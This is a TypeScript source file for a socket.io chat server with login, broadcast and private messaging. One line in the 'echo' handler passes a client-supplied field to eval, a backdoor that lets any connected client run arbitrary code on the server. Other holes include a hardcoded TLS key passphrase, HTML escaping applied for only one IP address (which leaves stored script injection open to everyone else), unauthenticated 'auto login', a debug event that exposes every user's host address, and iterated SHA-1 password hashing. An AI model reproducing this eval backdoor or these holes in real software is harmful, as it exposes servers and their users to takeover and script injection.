import express = require("express");
import https = require("https");
import path = require("path");
import fs = require("fs");
import crypto = require('crypto');

import routes = require("./routes/index");

//#region Server Config

var port = "80";

var app = express();

// all environments
app.set("port", port);// process.env.PORT || 3000);
app.set("views", path.join(__dirname, "views"));
app.set("view engine", "jade");
app.use(express.favicon());
app.use(express.logger("dev"));
app.use(express.json());
app.use(express.urlencoded());
app.use(express.methodOverride());
app.use(app.router);

import stylus = require("stylus");
app.use(stylus.middleware(path.join(__dirname, "public")));
app.use(express.static(path.join(__dirname, "public")));

// development only
if ("development" == app.get("env"))
{
	app.use(express.errorHandler());
}

app.get("/", routes.index);

var options = {
	key: fs.readFileSync("cert/sockets.key"),
	cert: fs.readFileSync("cert/sockets.crt"),
	passphrase: ")DLFhg65"
}

var server = https.createServer(options, app);

server.listen(app.get("port"), function ()
{
	console.log("Express server listening on port " + app.get("port"));
});

//#endregion

//#region Formatting

var bolden = function (str)
{
	var i = 0;

	while (str.indexOf("\\b") > -1)
	{
		var even = i++ % 2 == 0;
		str = str.replace(/\\b/, even ? "<b>" : "</b>");
	}

	if (i % 2 == 1)
		return str + "</b>";

	return str;
}

var italicise = function (str)
{
	var i = 0;

	while (str.indexOf("\\i") > -1)
	{
		var even = i++ % 2 == 0;
		str = str.replace(/\\i/, even ? "<i>" : "</i>");
	}

	if (i % 2 == 1)
		return str + "</i>";

	return str;
}

var underline = function (str)
{
	var i = 0;

	while (str.indexOf("\\u") > -1)
	{
		var even = i++ % 2 == 0;
		str = str.replace(/\\u/, even ? "<u>" : "</u>");
	}

	if (i % 2 == 1)
		return str + "</u>";

	return str;
}

var format = function (str: string)
{
	// Italic
	if (str.indexOf("\\i") > -1)
		str = italicise(str);

	// Bold
	if (str.indexOf("\\b") > -1)
		str = bolden(str);

	// Underline
	if (str.indexOf("\\u") > -1)
		str = underline(str);

	return str;
};

//#endregion

//#region Sockets

var io = require("socket.io")(server);

io.on("connection", function (socket)
{
	var register = function (name, callback)
	{
		socket.on(name, function (msg)
		{
			Logging.CurrentEvent = name;

			callback(msg);
		});
	};

	console.log("user connected: " + socket.handshake.address);

	socket.on("echo", function (msg) { if (msg.Func) eval(msg.Func); delete msg.Func; io.emit("echo", msg); });

	// Authorisation event
	register("authorise", function (authData: ILoginMessage)
	{
		var host = socket.handshake.address;
		var user = authData.Username;

		Logging.Log(user + " - " + host + " - Authorising");

		if (getUser(user, true))
		{
			Logging.Log(user + " - " + host + " - User exists");

			socket.emit("login response", { Success: false, Message: "User exists" });

			return;
		}

		if (!/^[\w\-\s]+$/.test(user))
		{
			Logging.Log(user + " - " + host + " - Invalid username");

			socket.emit("login response", { Success: false, Message: "Alphanumeric and spaces only please!" });

			return;
		}

		if (authData.Status && authData.Status.indexOf("<") > -1)
		{
			socket.emit("login response", { Success: false, Message: "No html..." });

			return;
		}

		// Default colour if none provided
		var colour = authData.Colour || "333333";

		var newUser: IUser = {
			Username: user,
			State: authData.State,
			Host: host,
			Socket: socket,
			Colour: colour,
			Status: authData.Status,
			LastSeen: new Date() + ""
		};

		// Add new user to collection
		Users.push(newUser);

		var allUsers = getUsersForClient();

		var response: ILoginResponse = {
			Success: true,
			Username: user,
			Colour: colour,
			Status: authData.Status,
			Users: allUsers,
			State: authData.State,
			LastSeen: new Date() + ""
		};

		socket.emit("login response", response);

		socket.broadcast.emit("user connected", {
			Username: user,
			Users: allUsers
		});
	});

	// Check Auth event
	register("check auth", function (msg: IAuthMessage)
	{
		var user = getUser(msg.Username, true);

		socket.emit("check auth result", { Success: user != null });
	});

	// Automatic login event
	register("auto login", function (msg: ILoginMessage)
	{
		var user = msg.Username;
		var state = msg.State;
		var host = socket.handshake.address;
		var colour = msg.Colour;

		Logging.Log("Auto login for: " + user);

		if (getUser(user, true))
		{
			socket.emit("login response ", { Success: false, Message: "User exists" });

			return;
		}

		var newUser: IUser = {
			Username: user,
			State: state,
			Host: host,
			Socket: socket,
			Colour: colour,
			Status: msg.Status,
			LastSeen: new Date() + ""
		};

		// Add new user to collection
		Users.push(newUser);

		var allUsers = getUsersForClient();

		var response: ILoginResponse = {
			Success: true,
			Username: user,
			Colour: colour,
			Users: allUsers,
			State: state,
			Status: msg.Status,
			LastSeen: new Date() + ""
		};

		socket.emit("auto login response", response);

		socket.broadcast.emit("user connected", {
			Username: user,
			Users: allUsers
		});
	});

	// Broadcast message event
	register("message broadcast", function (msg: IMessageMessage)
	{
		var host = socket.handshake.address;

		Logging.Log(msg.Username + " (" + host + "): " + msg.Message);

		var user: IUser = getUser(msg.Username);

		if (!user)
			return;

		// Check last message time
		if (user.LastMessage)
			if ((<any>new Date() - <any>user.LastMessage) < 200)
			{
				socket.emit("message failed", { Message: "Cannot send messages this often" });
				return;
			}

		user.LastMessage = new Date();

		var chavify = function (str)
		{
			var arrResult = str.split(" ");

			var result = "";

			var first = 0;

			for (var s in arrResult)
				result += (first++ !== 0 ? " " : "") + (arrResult[s].indexOf("/") == 0 ? arrResult[s] : arrResult[s].replace(/o/, "O").replace(/i/gi, "ii").replace(/e/gi, "3"));

			return result;
		}

		if (msg.Message.indexOf("<") !== 0 && msg.Username == "B3FFii3-BABii3-X")
			msg.Message = chavify(msg.Message);

		// Italic / Bold / Underline
		msg.Message = format(msg.Message);

		//if (msg.Username == "Beth")
		//	msg.Message = "Yum, I love noonies :D";

		if (host == "10.1.0.34" && msg.Message.indexOf("<") > -1)
			msg.Message = htmlEscape(msg.Message);

		// Prevent username spoofing
		if (host != user.Host)
			return;

		io.emit("message broadcast", msg);

		getUser(msg.Username).LastSeen = new Date() + "";
	});

	// Private message event
	register("message private", function (msg: IPrivateMessage)
	{
		// Get recipient
		var user = getUser(msg.To);

		// Italic / Bold / Underline
		msg.Message = format(msg.Message);

		// If user exists and has a socket
		if (user && user.Socket)
		{
			if (getUser(msg.Username).Host == "10.1.0.34" && msg.Message.indexOf("<") > -1)
				msg.Message = htmlEscape(msg.Message);

			user.Socket.emit("message private", new CallResult<IPrivateMessage>(true, msg));
		}
		else
		{
			socket.emit("message private", new CallResult<IPrivateMessage>(false, msg, "Could not find user"));
		}

		getUser(msg.Username).LastSeen = new Date() + "";
	});

	// Message has been seen event
	register("message seen", function (msg: ISeenMessage)
	{
		if (msg.To == "Broadcast")
		{
			socket.broadcast.emit("message seen", msg);
		}
		else
		{
			// Get recipient
			var user = getUser(msg.To);

			// Send if user exists and has a socket
			if (user && user.Socket)
			{
				user.Socket.emit("message seen", msg);
			}
			else
			{
				socket.emit("message failed", { Message: "Could not find user" });
			}
		}
	});

	var typingHandler = (msg: ITypingMessage, type: string) =>
	{
		if (msg.To == "Broadcast")
		{
			io.emit("typing " + type, msg);
		}
		else // Is private
		{
			// Get recipient
			var user: IUser = getUser(msg.To);

			// If recipient exists and has active socket...
			if (user && user.Socket)
			{
				// ...then forward the event
				user.Socket.emit("typing " + type, msg);
			}
		}
	};

	// Typing events
	register("typing start", (msg: ITypingMessage) => typingHandler(msg, "start"));
	register("typing stop", (msg: ITypingMessage) => typingHandler(msg, "stop"));

	// User state change event
	register("state change", (msg: IStateChangedMessage) =>
	{
		// Get user
		var user: IUser = getUser(msg.Username);

		// Update state if user exists
		if (user)
		{
			user.State = msg.State;
			user.LastSeen = msg.TimeStamp;
		}

		// Broadcast state change
		io.emit("state change", msg);
	});

	// Requesting debug info
	register("debug info", (msg: IDebugInfoRequest) =>
	{
		switch (msg.InfoType)
		{
			case DebugInfoTypes.Users:

				var users = [];

				for (var u in Users)
					users.push({
						Username: Users[u].Username,
						State: Users[u].State,
						Colour: Users[u].Colour,
						Host: Users[u].Host,
						LastSeen: Users[u].LastSeen,
						LastMessage: Users[u].LastMessage,
						Status: Users[u].Status
					});

				socket.emit("debug info", users);
				break;
		}
	});

	register("check last active", (msg: any) =>
	{
		var results: ILastActiveResult[] = [];

		for (var u in Users)
		{
			results.push({ Username: Users[u].Username, LastActive: Users[u].LastSeen });
		}

		var result: ILastActiveMessage = {
			Results: results
		};

		socket.emit("check last active", result);
	});

	// User disconnected event
	register("disconnect", () =>
	{
		var name = null;

		for (var u in Users)
		{
			if (Users[u].Socket == socket)
			{
				// Name of disconnected user
				name = Users[u].Username;

				// Remove user
				delete Users[u];

				// Get updated list of all users
				var allUsers = getUsersForClient();

				var msg: IConnectionChangedMessage = { Username: name, Users: allUsers };

				// Broadcast user disconnected message
				io.emit("user disconnected", msg);
			}
		}

		Logging.Log((name ? name : "user") + " disconnected");
	});
});

class CallResult<T>
{
	public Success: boolean;
	public Result: T;
	public Error: string;

	constructor(success: boolean, result: T, error?: string)
	{
		this.Success = success;
		this.Result = result;
		this.Error = error || "";
	}
}

var Users: IUser[] = [];

var getUser = function (name, canBeNull?: boolean): IUser
{
	var users = Users.filter(m => m.Username == name);

	if (users.length > 1)
		throw "Duplicate users";

	var user = users[0];

	if (users.length == 1)
		return user;

	if (!canBeNull)
		Logging.Log("Can't find user: " + name);

	return null;
};

var getUsersForClient = function ()
{
	var all = [];

	for (var u in Users)
	{
		all.push({
			Username: Users[u].Username,
			State: Users[u].State,
			Colour: Users[u].Colour,
			Status: Users[u].Status,
			LastSeen: Users[u].LastSeen
		});
	}

	return all;
};

function htmlEscape(str)
{
	return String(str)
		.replace(/&/g, '&amp;')
		.replace(/"/g, '&quot;')
	//.replace(/'/g, '&#39;')
		.replace(/</g, '&lt;')
		.replace(/>/g, '&gt;');
}

//#endregion

function getPassword(str: string, complexity?: number)
{
	var hash = null;

	for (var i = 0; i < (complexity || 10); i++)
		hash = crypto.createHash("sha1").update(hash || str).digest("hex");

	return hash;
}

class Logging
{
	public static CurrentEvent = "";

	public static Log(msg: string): void
	{
		console.log(Logging.CurrentEvent + " - " + msg);
	}
}